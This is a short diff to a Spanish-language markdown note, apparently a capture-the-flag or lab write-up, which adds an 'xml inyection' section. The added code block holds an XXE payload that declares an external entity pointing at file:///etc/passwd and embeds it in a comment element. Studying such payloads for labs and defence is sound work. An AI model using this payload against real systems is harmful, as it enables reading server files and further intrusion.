@@ -56,4 +56,10 @@ buscamos un decoder de hash SHA-1
 parece que tenemos un archivo xml
 ![[Pasted image 20231211222919.png]]
 ### xml inyection 
-``
+```python
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> 
+<comment> 
+<name>Joe Hamd</name> 
+<author>Barry Clad</author> <com>&test; </com> </comment>
+```
